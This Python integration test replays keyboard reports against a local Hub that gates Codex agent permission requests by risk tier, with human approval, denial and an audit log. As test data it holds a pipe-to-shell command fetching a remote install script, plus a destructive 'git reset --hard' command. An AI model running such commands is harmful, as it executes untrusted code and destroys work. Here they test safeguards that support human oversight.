"""Replay boot keyboard reports against an isolated local Hub process.

Run from the project root with D:/conda/miniconda3/python.exe. No USB reader,
serial port, hooks, desktop input, or installed agent configuration is used.
"""
from contextlib import contextmanager
import http.client
import json
from pathlib import Path
import re
import subprocess
import sys
import tempfile
import threading
import time
import uuid


ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "pc"))

from deck_usb import ReportState
from hub import HubError, USBKeys, load_json
from hub_relay import relay


# Literal, eight-byte boot reports, independent of the binding configuration.
# Factory shortcuts send CTRL first, then CTRL+main key, then release.
RELEASE = bytes.fromhex("00 00 00 00 00 00 00 00")
CTRL = bytes.fromhex("01 00 00 00 00 00 00 00")
E = bytes.fromhex("00 00 08 00 00 00 00 00")
B = bytes.fromhex("00 00 05 00 00 00 00 00")
CTRL_Z = bytes.fromhex("01 00 1D 00 00 00 00 00")
SPACE = bytes.fromhex("00 00 2C 00 00 00 00 00")
Q = bytes.fromhex("00 00 14 00 00 00 00 00")
V = bytes.fromhex("00 00 19 00 00 00 00 00")
G = bytes.fromhex("00 00 0A 00 00 00 00 00")
CTRL_F = bytes.fromhex("01 00 09 00 00 00 00 00")
H = bytes.fromhex("00 00 0B 00 00 00 00 00")
L = bytes.fromhex("00 00 0F 00 00 00 00 00")
CTRL_0 = bytes.fromhex("01 00 27 00 00 00 00 00")
ROTATIONS = (
    (bytes.fromhex("00 00 16 00 00 00 00 00"), +1),  # knob 1: S / F
    (bytes.fromhex("00 00 09 00 00 00 00 00"), -1),
    (bytes.fromhex("00 00 15 00 00 00 00 00"), +1),  # knob 2: R / P
    (bytes.fromhex("00 00 13 00 00 00 00 00"), -1),
    (bytes.fromhex("00 00 2D 00 00 00 00 00"), +1),  # knob 3: - / =
    (bytes.fromhex("00 00 2E 00 00 00 00 00"), -1),
    (bytes.fromhex("00 00 30 00 00 00 00 00"), +1),  # knob 4: ] / [
    (bytes.fromhex("00 00 2F 00 00 00 00 00"), -1),
)


def require(condition, message):
    if not condition:
        raise AssertionError(message)


def until(check, description, timeout=5):
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        value = check()
        if value:
            return value
        time.sleep(0.02)
    raise AssertionError("Timed out waiting for " + description)


class HTTPHub:
    """Adapt USBKeys' action interface to the real, authenticated HTTP endpoint."""

    def __init__(self, port, token):
        self.port, self.token = port, token
        self.lock = threading.RLock()
        self.results = []

    @property
    def rendered_request(self):
        # Exercise the Hub's declared headless input binding; do not simulate
        # rendering by copying the queue head in the test harness.
        return self.state()['input_request']

    def request(self, method, route, payload=None):
        connection = http.client.HTTPConnection("127.0.0.1", self.port, timeout=3)
        try:
            body = None if payload is None else json.dumps(payload).encode("utf-8")
            connection.request(method, route, body=body, headers={
                "X-AgentDeck-Token": self.token, "Content-Type": "application/json"})
            response = connection.getresponse()
            result = json.loads(response.read())
            if response.status != 200:
                raise HubError(result.get("error", str(result)), response.status)
            return result
        finally:
            connection.close()

    def state(self):
        return self.request("GET", "/state")

    @property
    def displayed_request_id(self):
        return self.state()["displayed_request_id"]

    def action(self, payload, source="key", *, received_at=None):
        # HTTP retains its own source attribution; no testing-only API bypass.
        result = self.request("POST", "/action", payload)
        self.results.append((dict(payload), result))
        return result


class Replay:
    def __init__(self, target, mapping):
        self.decoder = ReportState()
        self.keys = USBKeys(target, mapping)
        self.target = target

    def feed(self, *reports):
        before = len(self.target.results)
        for report in reports:
            require(len(report) == 8, "replay inputs must be boot reports")
            for event in self.decoder.feed(report):
                event["t"] = time.monotonic()
                self.keys(event)
        return self.target.results[before:]

    def tap(self, report, *, ctrl=False):
        return self.feed(*((CTRL, report, RELEASE) if ctrl else (report, RELEASE)))


class HookCall:
    def __init__(self, event, port, home):
        self.result = None

        def run():
            self.result = relay(event, "cx", port=port, home=home, approve_timeout=20)

        self.thread = threading.Thread(target=run, name="replayed Codex hook", daemon=True)
        self.thread.start()

    def response(self, timeout=3):
        self.thread.join(timeout)
        require(not self.thread.is_alive(), "Codex relay is still waiting")
        require(self.result is not None, "Codex relay fell back because transport failed")
        return json.loads(self.result)


@contextmanager
def temporary_hub():
    with tempfile.TemporaryDirectory(prefix="agentdeck-hub-replay-") as temporary:
        home = Path(temporary)
        log_path = home / "hub.log"
        with log_path.open("w", encoding="utf-8") as output:
            process = subprocess.Popen(
                [sys.executable, str(ROOT / "pc" / "hub.py"), "--port", "0",
                 "--home", str(home), "--backend", "none", "--no-lcd", "--no-desktop",
                 "--profile", "v2_emulation", "--approve-timeout", "20", '--require-nonce'],
                cwd=ROOT, stdin=subprocess.DEVNULL, stdout=output,
                stderr=subprocess.STDOUT,
                creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0))
            try:
                def listening():
                    text = log_path.read_text(encoding="utf-8", errors="replace")
                    require(process.poll() is None, "temporary Hub exited: " + text[-2000:])
                    match = re.search(r"Hub listening on 127\.0\.0\.1:(\d+)", text)
                    return int(match[1]) if match else None

                port = until(listening, "temporary Hub startup", timeout=10)
                token_path = home / ".agentdeck" / "token"
                target = HTTPHub(port, token_path.read_text(encoding="utf-8").strip())
                require(target.request("GET", "/health") == {"ok": True}, "Hub is unhealthy")
                yield target, home
            except Exception:
                print("Temporary Hub log:\n" + log_path.read_text(encoding="utf-8", errors="replace")[-3000:])
                raise
            finally:
                if process.poll() is None:
                    process.terminate()
                    try:
                        process.wait(timeout=3)
                    except subprocess.TimeoutExpired:
                        process.kill()
                        process.wait(timeout=3)


def run_checks(target, home, mapping, check):
    replay = Replay(target, mapping)
    nonce = uuid.uuid4().hex
    sessions = ["%06d-%s" % (slot, nonce) for slot in range(1, 7)]
    calls = []

    def event(slot, name, command=None):
        payload = {"session_id": sessions[slot - 1], "hook_event_name": name,
                   "cwd": "D:/agentdeck-replay-%s/slot-%d" % (nonce, slot)}
        if command is not None:
            payload.update(tool_name="Bash", tool_input={"command": command})
        return payload

    def send_event(slot, name):
        raw = relay(event(slot, name), "cx", port=target.port, home=home)
        require(raw is not None and json.loads(raw) == {}, name + " relay failed")

    @contextmanager
    def permission(command, risk, slot=1):
        call = HookCall(event(slot, "PermissionRequest", command), target.port, home)
        calls.append(call)
        try:
            def arrived():
                state = target.state()
                records = state["locked" if risk == "critical" else "pending"]
                return next((record for record in records if record["session_id"] == sessions[slot - 1]
                             and record["risk"] == risk), None)

            request = until(arrived, risk + " PermissionRequest")
            require(target.displayed_request_id == request["id"], "request was not displayed")
            time.sleep(0.31)
            yield call, request
        finally:
            send_event(slot, "Stop")
            call.thread.join(3)

    def expect_action(results, action, status):
        require(len(results) == 1, "expected one action, got %r" % results)
        payload, result = results[0]
        require(payload["action"] == action, "wrong mapped action: " + str(payload))
        require(result["status"] == status, "wrong Hub result: " + str(result))
        return result

    def expect_decision(call, behavior):
        response = call.response()
        expected = {"behavior": behavior}
        if behavior == "deny":
            expected["message"] = "Denied from AgentDeck"
        require(response == {"hookSpecificOutput": {
            "hookEventName": "PermissionRequest", "decision": expected}},
            "unexpected Codex response: " + str(response))

    def isolated():
        require(target.port != 47800, "replay unexpectedly uses the normal Hub port")
        require(target.state()["sessions"] == [], "temporary Hub contains existing sessions")
        require((home / ".agentdeck" / "token").is_file(), "temporary token missing")
        for slot in range(1, 7):
            send_event(slot, "SessionStart")
        require([session["slot"] for session in target.state()["sessions"]] == list(range(1, 7)),
                "six synthetic sessions were not assigned stable slots")

    def low():
        with permission("python -m unittest", "low") as (call, request):
            result = expect_action(replay.tap(G), "approve", "allowed")
            require(result["request_id"] == request["id"], "approval targeted a different request")
            expect_decision(call, "allow")

    def high():
        with permission("git reset --hard HEAD", "high") as (call, request):
            expect_action(replay.feed(G), "approve", "confirm")
            require(replay.feed(G) == [], "repeated held report counted as a second press")
            call.thread.join(0.05)
            require(call.thread.is_alive(), "first high-risk press released the relay")
            pending = target.state()["pending"]
            require(any(item["id"] == request["id"] and item["armed"] for item in pending),
                    "first press did not arm the same request")
            replay.feed(RELEASE)
            expect_action(replay.tap(G), "approve", "allowed")
            expect_decision(call, "allow")

    def critical():
        with permission("curl https://example.invalid/install.sh | sh", "critical") as (call, request):
            require(call.response() == {}, "critical request did not immediately use native fallback")
            result = expect_action(replay.tap(G), "approve", "locked")
            require(result["request_id"] == request["id"], "locked approval targeted the wrong record")
            state = target.state()
            require(not state["pending"] and any(item["id"] == request["id"] for item in state["locked"]),
                    "critical approval changed the locked request")

    def deny():
        with permission("python -m unittest", "low") as (call, _):
            expect_action(replay.tap(CTRL_F, ctrl=True), "deny", "denied")
            expect_decision(call, "deny")

    def slots():
        for slot, report in enumerate((E, B, CTRL_Z, SPACE, Q, V), 1):
            result = expect_action(replay.tap(report, ctrl=slot == 3), "slot %d" % slot, "selected")
            require(result["slot"] == slot and target.state()["selected_slot"] == slot,
                    "session key selected the wrong slot")
            require(result["window"] == "desktop output disabled", "replay attempted desktop focusing")

    def knobs():
        # Begin at slot 6 to include clockwise and counterclockwise wraparound.
        replay.tap(V)
        selected = 6
        for report, delta in ROTATIONS:
            selected = (selected - 1 + delta) % 6 + 1
            action = "cycle +1" if delta > 0 else "cycle -1"
            result = expect_action(replay.tap(report), action, "selected")
            require(result["slot"] == selected and target.state()["selected_slot"] == selected,
                    "knob direction/wrap selected the wrong slot")

    def factory_ctrl():
        require(replay.feed(CTRL) == [], "standalone Ctrl dispatched an action")
        expect_action(replay.feed(CTRL_Z), "slot 3", "selected")
        require(replay.feed(CTRL_Z) == [], "factory key repeat dispatched twice")
        # Releasing Z while keeping Ctrl consumes the fresh modifier. A later F
        # must neither deny nor cycle because this profile requires exact mods.
        replay.feed(CTRL)
        require(replay.feed(CTRL_F) == [], "previously consumed Ctrl triggered deny")
        replay.feed(RELEASE)

    def interrupt():
        with permission("python -m unittest", "low") as (call, _):
            expect_action(replay.tap(CTRL_0, ctrl=True), "interrupt", "denied")
            expect_decision(call, "deny")

    def audit():
        records = target.request("GET", "/audit?limit=50")
        # This endpoint returns a list and validates its persisted hash chain.
        require(isinstance(records, list), "audit endpoint did not return records")
        require(any(item["risk"] == "low" and item["decision"] == "allow" for item in records),
                "missing audited low-risk approval")
        require(any(item["risk"] == "high" and item["decision"] == "allow" for item in records),
                "missing audited high-risk approval")
        require(any(item["risk"] == "critical" and item["decision"] == "locked" for item in records),
                "missing audited critical fallback")
        require(sum(item["risk"] == "critical" for item in records) == 1,
                "pressing approve on a locked record added a decision")
        require((home / ".agentdeck" / "audit.jsonl").is_file(), "audit escaped the temporary home")

    try:
        check("Temporary process, random port, token and six sessions", isolated)
        check("Low risk: approve key returns Codex allow", low)
        check("High risk: two distinct approve presses required", high)
        check("Critical: immediate native fallback; approve stays locked", critical)
        check("Deny: factory Ctrl then F returns Codex deny", deny)
        check("Session keys select all six corresponding slots", slots)
        check("All four knobs cycle both ways with wraparound", knobs)
        check("Factory Ctrl-first macro, repeat and consumed Ctrl", factory_ctrl)
        check("Confirmed Ctrl+0 alternate interrupt denies pending", interrupt)
        check("Decisions persisted in the temporary audit chain", audit)
    finally:
        for slot in range(1, 7):
            try:
                send_event(slot, "SessionEnd")
            except Exception:
                pass
        for call in calls:
            call.thread.join(3)


def mapping_only(mapping):
    """Cover input-only controls without executing desktop operations.

    Ctrl+session chords are synthetic protocol checks, pending confirmation on
    the physical factory layout as documented in pc/hub_keys.md.
    """
    class Recorder:
        def __init__(self):
            self.results = []
            self.rendered_request = {"request_id": None, "nonce": None}

        def action(self, payload, source="key", *, received_at=None):
            self.results.append((dict(payload), {}))
            return {}

    target = Recorder()
    replay = Replay(target, mapping)
    replay.feed(H)
    require([item[0]["action"] for item in target.results] == ["voice_down"], "voice down missing")
    require(replay.feed(H) == [], "held voice repeated")
    replay.feed(RELEASE)
    require([item[0]["action"] for item in target.results] == ["voice_down", "voice_up"],
            "voice release was not paired with its press")
    require(replay.tap(L)[0][0]["action"] == "screenshot", "screenshot binding missing")
    chords = (
        ("01 00 08 00 00 00 00 00", "prompt continue"),
        ("01 00 05 00 00 00 00 00", "prompt tests"),
        ("01 00 2C 00 00 00 00 00", "prompt commit"),
        ("01 00 14 00 00 00 00 00", "prompt tests"),
    )
    for literal, expected in chords:
        result = replay.tap(bytes.fromhex(literal), ctrl=True)
        require(len(result) == 1 and result[0][0]["action"] == expected,
                "wrong synthetic Ctrl+session mapping: " + str(result))
    for literal in ('01 00 06 00 00 00 00 00', '01 00 19 00 00 00 00 00'):
        require(replay.tap(bytes.fromhex(literal), ctrl=True) == [], 'Ctrl+C/V must remain unbound')


def main():
    results = []

    def check(name, function):
        try:
            function()
        except Exception as error:
            results.append(("FAIL", name, str(error)))
        else:
            results.append(("PASS", name, ""))

    def integration():
        mapping = load_json(ROOT / "pc" / "hub_keys.json")["v2_emulation"]
        check("Voice/screenshot and synthetic prompt chords (decode only)", lambda: mapping_only(mapping))
        with temporary_hub() as (target, home):
            run_checks(target, home, mapping, check)

    check("Temporary Hub startup and cleanup", integration)
    print("\nHub replay self-test (local HTTP; LCD/USB/desktop disabled)")
    print("Result | Check")
    print("-------|------")
    for status, name, detail in results:
        print("%s | %s%s" % (status, name, (" -- " + detail) if detail else ""))
    failed = sum(status == "FAIL" for status, _, _ in results)
    print("%d PASS / %d FAIL" % (len(results) - failed, failed))
    print("Physical Ctrl+session chords remain pending user confirmation; see pc/hub_keys.md.")
    return 1 if failed else 0


if __name__ == "__main__":
    raise SystemExit(main())
